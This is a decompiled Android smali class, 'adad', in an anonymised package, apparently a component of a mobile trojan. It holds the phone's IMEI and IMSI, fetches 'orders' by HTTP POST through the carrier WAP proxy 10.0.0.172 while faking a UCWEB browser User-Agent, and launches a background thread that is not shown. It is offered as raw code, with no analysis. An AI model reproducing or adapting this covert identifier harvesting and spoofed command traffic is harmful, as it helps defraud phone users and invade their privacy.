.class public Lcom/xxx/yyy/adad;
.super Ljava/lang/Object;
.source "adad.java"


# static fields
.field static Max_Try_Count:I

.field static Min_Error_Count:I


# instance fields
.field private context:Landroid/content/Context;

.field private errorcount:I

.field private imei:Ljava/lang/String;

.field private imsi:Ljava/lang/String;

.field private iswap:I

.field private key:Ljava/lang/String;

.field private trycount:I

.field private ua:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .registers 1

    .prologue
    .line 38
    const/4 v0, 0x3

    sput v0, Lcom/xxx/yyy/adad;->Max_Try_Count:I

    .line 39
    const/16 v0, 0x14

    sput v0, Lcom/xxx/yyy/adad;->Min_Error_Count:I

    .line 31
    return-void
.end method

.method public constructor <init>(Ljava/lang/String;Ljava/lang/String;ILjava/lang/String;Landroid/content/Context;)V
    .registers 7
    .parameter "im"
    .parameter "ie"
    .parameter "iw"
    .parameter "kk"
    .parameter "ct"

    .prologue
    .line 42
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 44
    iput-object p1, p0, Lcom/xxx/yyy/adad;->imsi:Ljava/lang/String;

    .line 45
    iput-object p2, p0, Lcom/xxx/yyy/adad;->imei:Ljava/lang/String;

    .line 46
    iput p3, p0, Lcom/xxx/yyy/adad;->iswap:I

    .line 47
    iput-object p4, p0, Lcom/xxx/yyy/adad;->key:Ljava/lang/String;

    .line 48
    iput-object p5, p0, Lcom/xxx/yyy/adad;->context:Landroid/content/Context;

    .line 49
    sget v0, Lcom/xxx/yyy/adad;->Max_Try_Count:I

    iput v0, p0, Lcom/xxx/yyy/adad;->trycount:I

    .line 50
    const/4 v0, 0x0

    iput v0, p0, Lcom/xxx/yyy/adad;->errorcount:I

    .line 51
    return-void
.end method

.method private GetOrder(Ljava/lang/String;)Ljava/lang/String;
    .registers 14
    .parameter "url"

    .prologue
    const-string v11, ""

    .line 170
    new-instance v2, Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-direct {v2}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>()V

    .line 173
    .local v2, httpClient:Lorg/apache/http/impl/client/DefaultHttpClient;
    iget v8, p0, Lcom/xxx/yyy/adad;->iswap:I

    if-nez v8, :cond_1f

    .line 175
    new-instance v4, Lorg/apache/http/HttpHost;

    const-string v8, "10.0.0.172"

    const/16 v9, 0x50

    const-string v10, "http"

    invoke-direct {v4, v8, v9, v10}, Lorg/apache/http/HttpHost;-><init>(Ljava/lang/String;ILjava/lang/String;)V

    .line 176
    .local v4, proxy:Lorg/apache/http/HttpHost;
    invoke-virtual {v2}, Lorg/apache/http/impl/client/DefaultHttpClient;->getParams()Lorg/apache/http/params/HttpParams;

    move-result-object v8

    const-string v9, "http.route.default-proxy"

    invoke-interface {v8, v9, v4}, Lorg/apache/http/params/HttpParams;->setParameter(Ljava/lang/String;Ljava/lang/Object;)Lorg/apache/http/params/HttpParams;

    .line 178
    .end local v4           #proxy:Lorg/apache/http/HttpHost;
    :cond_1f
    new-instance v3, Lorg/apache/http/client/methods/HttpPost;

    invoke-direct {v3, p1}, Lorg/apache/http/client/methods/HttpPost;-><init>(Ljava/lang/String;)V

    .line 180
    .local v3, method:Lorg/apache/http/client/methods/HttpPost;
    const-string v8, "User-Agent"

    const-string v9, "J2ME/UCWEB7.4.0.57"

    invoke-virtual {v3, v8, v9}, Lorg/apache/http/client/methods/HttpPost;->addHeader(Ljava/lang/String;Ljava/lang/String;)V

    .line 181
    const-string v8, "Accept"

    const-string v9, "application/vnd.wap.xhtml+xml,application/xml,text/vnd.wap.wml,text/html,application/xhtml+xml,image/jpeg;q=0.5,image/png;q=0.5,image/gif;q=0.5,image/*;q=0.6,video/*,audio/*,*/*;"

    invoke-virtual {v3, v8, v9}, Lorg/apache/http/client/methods/HttpPost;->addHeader(Ljava/lang/String;Ljava/lang/String;)V

    .line 195
    :try_start_32
    invoke-virtual {v2, v3}, Lorg/apache/http/impl/client/DefaultHttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;

    move-result-object v5

    .line 196
    .local v5, resp:Lorg/apache/http/HttpResponse;
    invoke-interface {v5}, Lorg/apache/http/HttpResponse;->getStatusLine()Lorg/apache/http/StatusLine;

    move-result-object v8

    invoke-interface {v8}, Lorg/apache/http/StatusLine;->getStatusCode()I
    :try_end_3d
    .catch Lorg/apache/http/client/ClientProtocolException; {:try_start_32 .. :try_end_3d} :catch_5b
    .catch Ljava/io/IOException; {:try_start_32 .. :try_end_3d} :catch_64
    .catch Ljava/lang/Exception; {:try_start_32 .. :try_end_3d} :catch_6d

    move-result v7

    .line 198
    .local v7, status:I
    const/16 v8, 0xc8

    if-eq v7, v8, :cond_46

    .line 199
    const-string v8, ""

    move-object v8, v11

    .line 218
    .end local v5           #resp:Lorg/apache/http/HttpResponse;
    .end local v7           #status:I
    :goto_45
    return-object v8

    .line 201
    .restart local v5       #resp:Lorg/apache/http/HttpResponse;
    .restart local v7       #status:I
    :cond_46
    :try_start_46
    invoke-interface {v5}, Lorg/apache/http/HttpResponse;->getEntity()Lorg/apache/http/HttpEntity;

    move-result-object v1

    .line 203
    .local v1, entity:Lorg/apache/http/HttpEntity;
    invoke-interface {v1}, Lorg/apache/http/HttpEntity;->getContent()Ljava/io/InputStream;

    move-result-object v8

    invoke-virtual {p0, v8}, Lcom/xxx/yyy/adad;->generateString(Ljava/io/InputStream;)Ljava/lang/String;

    move-result-object v6

    .line 205
    .local v6, result:Ljava/lang/String;
    invoke-virtual {v2}, Lorg/apache/http/impl/client/DefaultHttpClient;->getConnectionManager()Lorg/apache/http/conn/ClientConnectionManager;

    move-result-object v8

    invoke-interface {v8}, Lorg/apache/http/conn/ClientConnectionManager;->shutdown()V
    :try_end_59
    .catch Lorg/apache/http/client/ClientProtocolException; {:try_start_46 .. :try_end_59} :catch_5b
    .catch Ljava/io/IOException; {:try_start_46 .. :try_end_59} :catch_64
    .catch Ljava/lang/Exception; {:try_start_46 .. :try_end_59} :catch_6d

    move-object v8, v6

    .line 206
    goto :goto_45

    .line 207
    .end local v1           #entity:Lorg/apache/http/HttpEntity;
    .end local v5           #resp:Lorg/apache/http/HttpResponse;
    .end local v6           #result:Ljava/lang/String;
    .end local v7           #status:I
    :catch_5b
    move-exception v8

    move-object v0, v8

    .line 209
    .local v0, e:Lorg/apache/http/client/ClientProtocolException;
    invoke-virtual {v0}, Lorg/apache/http/client/ClientProtocolException;->printStackTrace()V

    .line 210
    const-string v8, ""

    move-object v8, v11

    goto :goto_45

    .line 211
    .end local v0           #e:Lorg/apache/http/client/ClientProtocolException;
    :catch_64
    move-exception v8

    move-object v0, v8

    .line 213
    .local v0, e:Ljava/io/IOException;
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    .line 214
    const-string v8, ""

    move-object v8, v11

    goto :goto_45

    .line 215
    .end local v0           #e:Ljava/io/IOException;
    :catch_6d
    move-exception v8

    move-object v0, v8

    .line 217
    .local v0, e:Ljava/lang/Exception;
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    .line 218
    const-string v8, ""

    move-object v8, v11

    goto :goto_45
.end method

.method static synthetic access$0(Lcom/xxx/yyy/adad;)Ljava/lang/String;
    .registers 2
    .parameter

    .prologue
    .line 33
    iget-object v0, p0, Lcom/xxx/yyy/adad;->imei:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$1(Lcom/xxx/yyy/adad;)Ljava/lang/String;
    .registers 2
    .parameter

    .prologue
    .line 32
    iget-object v0, p0, Lcom/xxx/yyy/adad;->imsi:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$2(Lcom/xxx/yyy/adad;)Ljava/lang/String;
    .registers 2
    .parameter

    .prologue
    .line 35
    iget-object v0, p0, Lcom/xxx/yyy/adad;->key:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$3(Lcom/xxx/yyy/adad;)I
    .registers 2
    .parameter

    .prologue
    .line 40
    iget v0, p0, Lcom/xxx/yyy/adad;->trycount:I

    return v0
.end method

.method static synthetic access$4(Lcom/xxx/yyy/adad;I)V
    .registers 2
    .parameter
    .parameter

    .prologue
    .line 40
    iput p1, p0, Lcom/xxx/yyy/adad;->trycount:I

    return-void
.end method

.method static synthetic access$5(Lcom/xxx/yyy/adad;I)V
    .registers 2
    .parameter
    .parameter

    .prologue
    .line 41
    iput p1, p0, Lcom/xxx/yyy/adad;->errorcount:I

    return-void
.end method

.method static synthetic access$6(Lcom/xxx/yyy/adad;Ljava/lang/String;)Ljava/lang/String;
    .registers 3
    .parameter
    .parameter

    .prologue
    .line 169
    invoke-direct {p0, p1}, Lcom/xxx/yyy/adad;->GetOrder(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method static synthetic access$7(Lcom/xxx/yyy/adad;)I
    .registers 2
    .parameter

    .prologue
    .line 36
    iget v0, p0, Lcom/xxx/yyy/adad;->iswap:I

    return v0
.end method

.method static synthetic access$8(Lcom/xxx/yyy/adad;)Landroid/content/Context;
    .registers 2
    .parameter

    .prologue
    .line 37
    iget-object v0, p0, Lcom/xxx/yyy/adad;->context:Landroid/content/Context;

    return-object v0
.end method

.method static synthetic access$9(Lcom/xxx/yyy/adad;)I
    .registers 2
    .parameter

    .prologue
    .line 41
    iget v0, p0, Lcom/xxx/yyy/adad;->errorcount:I

    return v0
.end method


# virtual methods
.method public StartGo()V
    .registers 2

    .prologue
    .line 54
    new-instance v0, Lcom/xxx/yyy/adad$1;

    invoke-direct {v0, p0}, Lcom/xxx/yyy/adad$1;-><init>(Lcom/xxx/yyy/adad;)V

    .line 144
    invoke-virtual {v0}, Lcom/xxx/yyy/adad$1;->start()V

    .line 145
    return-void
.end method

.method public generateString(Ljava/io/InputStream;)Ljava/lang/String;
    .registers 8
    .parameter "stream"

    .prologue
    .line 148
    new-instance v3, Ljava/io/InputStreamReader;

    invoke-direct {v3, p1}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    .line 149
    .local v3, reader:Ljava/io/InputStreamReader;
    new-instance v0, Ljava/io/BufferedReader;

    invoke-direct {v0, v3}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 150
    .local v0, buffer:Ljava/io/BufferedReader;
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    .line 153
    .local v4, sb:Ljava/lang/StringBuilder;
    :goto_f
    :try_start_f
    invoke-virtual {v0}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;
    :try_end_12
    .catch Ljava/io/IOException; {:try_start_f .. :try_end_12} :catch_21

    move-result-object v1

    .local v1, cur:Ljava/lang/String;
    if-nez v1, :cond_1d

    .line 162
    .end local v1           #cur:Ljava/lang/String;
    :goto_15
    :try_start_15
    invoke-virtual {p1}, Ljava/io/InputStream;->close()V
    :try_end_18
    .catch Ljava/io/IOException; {:try_start_15 .. :try_end_18} :catch_27

    .line 167
    :goto_18
    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    return-object v5

    .line 154
    .restart local v1       #cur:Ljava/lang/String;
    :cond_1d
    :try_start_1d
    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    :try_end_20
    .catch Ljava/io/IOException; {:try_start_1d .. :try_end_20} :catch_21

    goto :goto_f

    .line 157
    .end local v1           #cur:Ljava/lang/String;
    :catch_21
    move-exception v5

    move-object v2, v5

    .line 159
    .local v2, e:Ljava/io/IOException;
    invoke-virtual {v2}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_15

    .line 163
    .end local v2           #e:Ljava/io/IOException;
    :catch_27
    move-exception v2

    .line 165
    .restart local v2       #e:Ljava/io/IOException;
    invoke-virtual {v2}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_18
.end method
